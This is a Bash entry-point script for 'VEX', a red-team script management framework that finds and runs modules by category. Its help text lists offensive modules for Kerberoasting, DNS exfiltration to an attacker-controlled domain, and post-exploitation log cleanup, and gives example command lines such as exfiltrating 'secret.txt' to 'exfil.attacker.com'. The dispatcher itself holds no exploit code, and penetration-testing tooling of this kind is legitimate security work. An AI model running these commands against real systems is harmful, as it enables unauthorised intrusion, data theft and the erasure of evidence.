#!/usr/bin/env bash
# =============================================================================
# V.E.X. — Volatile Execution X-tension
# Master CLI entry-point  (Bash — works on Linux, macOS, and Windows via WSL/Git Bash)
# =============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
VEX_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
MODULES_DIR="${VEX_ROOT}/modules"
LIB_DIR="${VEX_ROOT}/lib"

# ---------------------------------------------------------------------------
# Source shared helpers (provides VEX_OS, is_linux, is_macos, is_windows, etc.)
# ---------------------------------------------------------------------------
[[ -f "${LIB_DIR}/utils.sh" ]] && source "${LIB_DIR}/utils.sh"

# ---------------------------------------------------------------------------
# Locate Python 3 (handles different install names across platforms)
# ---------------------------------------------------------------------------
_find_python3() {
  for candidate in python3 python py; do
    if command -v "$candidate" &>/dev/null; then
      local ver
      ver="$("$candidate" --version 2>&1)"
      if [[ "$ver" == Python\ 3* ]]; then
        echo "$candidate"; return
      fi
    fi
  done
  echo ""
}
# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
print_banner() {
  local os_label="${VEX_OS:-unknown}"
  cat <<'EOF'

$$\    $$\ $$$$$$$$\ $$\   $$\
$$ |   $$ |$$  _____|$$ |  $$ |
$$ |   $$ |$$ |      \$$\ $$  |
\$$\  $$  |$$$$$\     \$$$$  /
 \$$\$$  / $$  __|    $$  $$<
  \$$$  /  $$ |      $$  /\$$\
   \$  /   $$$$$$$$\ $$ /  $$ |
    \_/    \________|\__|  \__|
EOF
  cat <<BANNER

  VOLATILE EXECUTION X-TENSION
 [ Red Team Script Management Framework ]
 [ OS: ${os_label} | VEX_ROOT: ${VEX_ROOT} ]

BANNER
}

# ---------------------------------------------------------------------------
# Usage
# ---------------------------------------------------------------------------
usage() {
  cat <<'EOF'
VEX 1.0.0 ( https://github.com/voido/VEX )
Usage: vex [Global Flags] {category} {script} [Script Options]
GLOBAL FLAGS:
  -h, --help                          Print this help summary
  -l, --list [category]               List available modules (optionally filter by category)
  -ai                                 Enable AI-assisted context for any module
MODULE EXECUTION:
  vex <category> <script> [args...]   Dynamically discover and run a module script
                                      Extension (.py / .sh) is optional; VEX resolves it automatically
CATEGORIES:
  active-directory    Active Directory attacks (Kerberoasting, etc.)
  cloud               Cloud service enumeration (AWS S3, etc.)
  exfil               Data exfiltration techniques (DNS tunnelling, etc.)
  mobile              Mobile application analysis (APK decompilation, etc.)
  network             Network scanning and enumeration (port scans, etc.)
  os                  OS-level reconnaissance (SUID scan, etc.)
  post-ex             Post-exploitation cleanup and persistence
  web                 Web application reconnaissance and testing
SCRIPT OPTIONS (per module — pass -h to any script for details):
  active-directory/kerberoast:
    -d, --domain <domain>             Target domain (e.g. corp.local)
    -u, --user <username>             Domain username
    -p, --password <password>         Domain password
    -dc, --dc-ip <ip>                 Domain controller IP
    -o, --output <file>               Save hashes to file
  cloud/aws_s3_enum:
    -b, --bucket <name>               Specific bucket name to probe
    -p, --profile <profile>           AWS CLI profile (default: default)
  exfil/dns_exfil:
    -f, --file <path>                 File to exfiltrate
    -d, --domain <domain>             Attacker-controlled DNS domain
    -c, --chunk-size <bytes>          Bytes per DNS label (default: 30)
    --delay <seconds>                 Seconds between queries (default: 0.5)
  mobile/apk_decompile:
    <apk_file>                        Path to APK file
    -o, --output <dir>                Output directory
  network/port_scan:
    <target>                          Target host or CIDR
    -p, --ports <range>               Port range (default: 1-1024)
    -o, --output <prefix>             Output file prefix (saved to loot/)
  os/linux_suid_scan:                 [Linux only]
    -o, --output <file>               Write results to file
  post-ex/cleanup_logs:               [Linux/macOS only]
    -n, --dry-run                     Show what would be removed without deleting
    -v, --verbose                     Verbose output
  web/recon:
    -t, --target <url>                Target URL (e.g. https://example.com)
    -o, --output <file>               Write results to file
AI INTEGRATION:
  VEX_AI_KEY                          Set in environment to enable live AI queries
  VEX_AI_ENDPOINT                     LLM API endpoint (default: OpenAI-compatible)
  VEX_AI_MODEL                        Model name (default: gpt-4o)
OUTPUT:
  All module output is saved to the loot/ directory by default.
  Use -o on individual modules to customise output location.
CONFIGURATION:
  data/config.ini                     Global framework settings
  data/config.local.ini               Local overrides (git-ignored)
PLATFORM SUPPORT:
  Windows                             Native via PowerShell; .sh modules delegate to WSL
  macOS                               Native via Bash and Python 3
  Linux                               Native via Bash and Python 3
EXAMPLES:
  vex web recon -t https://example.com
  vex network port_scan 192.168.1.0/24 -p 1-65535
  vex active-directory kerberoast -d corp.local -u admin -p pass -o hashes.txt
  vex cloud aws_s3_enum -b my-bucket -p prod
  vex exfil dns_exfil -f secret.txt -d exfil.attacker.com --delay 0.1
  vex mobile apk_decompile target.apk -o ./output
  vex post-ex cleanup_logs -n -v
  vex os linux_suid_scan -o suid_results.txt
  vex -l network
  vex web recon -ai -t https://example.com
SEE THE README (https://github.com/voido/VEX) FOR MORE INFORMATION
EOF
}

# ---------------------------------------------------------------------------
# List available categories
# ---------------------------------------------------------------------------
list_categories() {
  local prefix="${1:-}"
  for dir in "${MODULES_DIR}"/*/; do
    [[ -d "$dir" ]] && printf '%s%s\n' "$prefix" "$(basename "$dir")"
  done
}

# ---------------------------------------------------------------------------
# List scripts in a category (or all categories)
# ---------------------------------------------------------------------------
list_modules() {
  local category="${1:-}"

  if [[ -n "$category" ]]; then
    local cat_path="${MODULES_DIR}/${category}"
    if [[ ! -d "$cat_path" ]]; then
      echo "[!] Unknown category: ${category}" >&2
      echo "    Available: $(list_categories)" >&2
      exit 1
    fi
    echo "[*] Scripts in '${category}':"
    _list_scripts_in "$cat_path" "  "
  else
    echo "[*] All available modules:"
    for dir in "${MODULES_DIR}"/*/; do
      [[ -d "$dir" ]] || continue
      echo "  [$(basename "${dir%/}")]"
      # Remove trailing slash for listing
      _list_scripts_in "${dir%/}" "    "
    done
  fi
}

# Print executable scripts in a directory
_list_scripts_in() {
  local dir="$1" prefix="${2:-  }"
  local found=0
  while IFS= read -r -d '' file; do
    printf '%s%s\n' "$prefix" "$(basename "$file")"
    found=1
  done < <(find "$dir" -maxdepth 1 \( -name "*.py" -o -name "*.sh" -o -perm /111 \) -not -type d -print0 2>/dev/null | sort -z)
  [[ $found -eq 0 ]] && printf '%s%s\n' "$prefix" "(no scripts yet)" || true
}

# ---------------------------------------------------------------------------
# Resolve and execute a script dynamically
# ---------------------------------------------------------------------------
run_module() {
  local category="$1"
  local script_name="$2"
  shift 2
  local remaining_args=("$@")

  # Detect and strip -ai flag
  local ai_mode=false
  local exec_args=()
  for arg in "${remaining_args[@]}"; do
    if [[ "$arg" == "-ai" ]]; then
      ai_mode=true
    else
      exec_args+=("$arg")
    fi
  done

  local cat_path="${MODULES_DIR}/${category}"
  if [[ ! -d "$cat_path" ]]; then
    echo "[!] Unknown category: ${category}" >&2
    echo "    Run 'vex list' to see available categories." >&2
    exit 1
  fi

  # Dynamic discovery — find the script by name (with or without extension)
  local target
  target="$(find_script "$cat_path" "$script_name")"
  if [[ -z "$target" ]]; then
    echo "[!] Script '${script_name}' not found in category '${category}'." >&2
    echo "    Run 'vex list ${category}' to see available scripts." >&2
    exit 1
  fi

  # AI-mode header
  if $ai_mode; then
    ai_context "$category" "$target" "${exec_args[@]:-}"
  fi

  execute_script "$target" "${exec_args[@]:-}"
}

# ---------------------------------------------------------------------------
# Dynamic script finder
#   Searches for exact name match, then tries appending .py / .sh
# ---------------------------------------------------------------------------
find_script() {
  local dir="$1"
  local name="$2"
  local candidate

  # Exact match
  candidate="${dir}/${name}"
  if [[ -f "$candidate" ]]; then
    echo "$candidate"; return
  fi

  # Try known extensions
  for ext in .py .sh; do
    candidate="${dir}/${name}${ext}"
    if [[ -f "$candidate" ]]; then
      echo "$candidate"; return
    fi
  done

  # Fuzzy: any executable whose basename (without extension) matches
  while IFS= read -r -d '' file; do
    local base
    base="$(basename "$file")"
    base="${base%.*}"
    if [[ "$base" == "$name" ]]; then
      echo "$file"; return
    fi
  done < <(find "$dir" -maxdepth 1 -type f -print0 2>/dev/null)
}

# ---------------------------------------------------------------------------
# Execute a script based on its type
# ---------------------------------------------------------------------------
execute_script() {
  local script="$1"
  shift
  local args=("$@")

  if [[ ! -f "$script" ]]; then
    echo "[!] Script not found: ${script}" >&2
    exit 1
  fi

  echo "[>] Executing: $(basename "$script") ${args[*]:-}"
  echo ""

  case "$script" in
    *.py)
      local python
      python="$(_find_python3)"
      if [[ -z "$python" ]]; then
        echo "[!] Python 3 not found. Install from https://python.org" >&2
        exit 1
      fi
      "$python" "$script" "${args[@]:-}"
      ;;
    *.sh)
      bash "$script" "${args[@]:-}"
      ;;
    *)
      if [[ -x "$script" ]]; then
        "$script" "${args[@]:-}"
      else
        echo "[!] Cannot determine how to execute: ${script}" >&2
        echo "    Ensure the file is executable or has a recognised extension (.py / .sh)." >&2
        exit 1
      fi
      ;;
  esac
}

# ---------------------------------------------------------------------------
# AI context stub — outputs metadata about the script being run.
# Replace the body with an actual LLM API call when ready.
# ---------------------------------------------------------------------------
ai_context() {
  local category="$1"
  local script="$2"
  shift 2
  local args=("$@")

  cat <<EOF
[AI] ── VEX AI-Assist ─────────────────────────────────────────────────────
  Category : ${category}
  Script   : $(basename "$script")
  Args     : ${args[*]:-<none>}
  Path     : ${script}

  [AI] Analysing script capabilities…
$(head -20 "$script" 2>/dev/null | sed 's/^/  /')
  ──────────────────────────────────────────────────────────────────────────
  NOTE: Full AI integration requires setting VEX_AI_KEY and pointing
        lib/ai.sh at a supported LLM endpoint (see data/config.ini).
────────────────────────────────────────────────────────────────────────────
EOF
}

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
print_banner

case "${1:-}" in
  "")
    # No arguments — just the splash screen (already printed above)
    ;;
  --help|-h)
    usage
    ;;
  --list|-l)
    list_modules "${2:-}"
    ;;
  -*)
    echo "[!] Unknown flag: $1" >&2
    echo "    Run 'vex -h' for usage." >&2
    exit 1
    ;;
  *)
    if [[ $# -lt 2 ]]; then
      echo "[!] Missing script name. Usage: vex <category> <script> [args...]" >&2
      echo "    Run 'vex -h' for help or 'vex -l' to list modules." >&2
      exit 1
    fi
    run_module "$1" "$2" "${@:3}"
    ;;
esac
